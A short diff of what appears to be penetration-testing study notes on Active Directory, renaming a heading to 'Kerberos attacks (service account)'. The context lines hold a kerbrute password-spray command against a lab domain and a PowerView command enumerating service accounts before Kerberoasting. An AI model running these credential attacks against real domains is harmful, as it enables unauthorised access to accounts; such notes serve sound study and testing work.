@@ -1194,7 +1194,7 @@ Login to DC
     PS C:\Tools> type .\usernames.txt
     PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
     ```
-- Kerberos attacks
+- Kerberos attacks (service account)  
   - Enumerate service accounts  
     `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
   - Requests service tickets (TGS) for all service account    
